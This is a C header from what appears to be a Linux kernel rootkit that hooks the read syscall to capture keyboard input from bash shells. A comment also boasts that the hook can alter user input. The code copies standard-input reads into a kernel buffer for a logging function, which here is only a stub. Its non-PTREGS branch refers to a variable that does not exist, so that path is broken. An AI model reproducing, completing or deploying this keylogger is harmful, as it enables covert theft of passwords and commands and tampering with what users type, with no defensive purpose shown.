#ifndef KEYLOG_KITE
    #define KEYLOG_KITE
    #include <linux/types.h>
    
    #include "kite_hook.h"
/*bash is interactive, using read to always read input from stdin, 
  we can hook read to keylog bash shells, also used as a command logger for non-interactive shells,
  can use this function to alter user input and mess a bit with them (;*/

static int logger(char *str, int count){
    return 0;
}


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage ssize_t hack_read(struct pt_regs *regs){
    long error;
    size_t count = regs->dx;
    char *temp_buf = kmalloc(count, GFP_KERNEL);


    if(temp_buf == NULL){
        return orig_read(regs);
    }

    if(regs->di == 0){
        error = copy_from_user(temp_buf, (const char *)regs->si, count);
        if(error){
          kfree(temp_buf);
          return orig_read(regs);
        }
        logger(temp_buf, count);
    }

    kfree(temp_buf);
    return orig_read(regs);
}
#else
static asmlinkage ssize_t hack_read(int fd, void *buf, size_t count){
    long error;
    char *temp_buf = kmalloc(count, GFP_KERNEL);

    if(temp_buf == NULL){
        return orig_read(fd, buf, count);
    }

    if(regs->di == 0){
        error = copy_from_user(temp_buf, (const char *)buf, count);
        if(error){
          kfree(temp_buf);
          return orig_read(fd, buf, count);
        }
        logger(temp_buf, count);
    }

    kfree(temp_buf);
    return orig_read(fd, buf, count);
}
#endif
#endif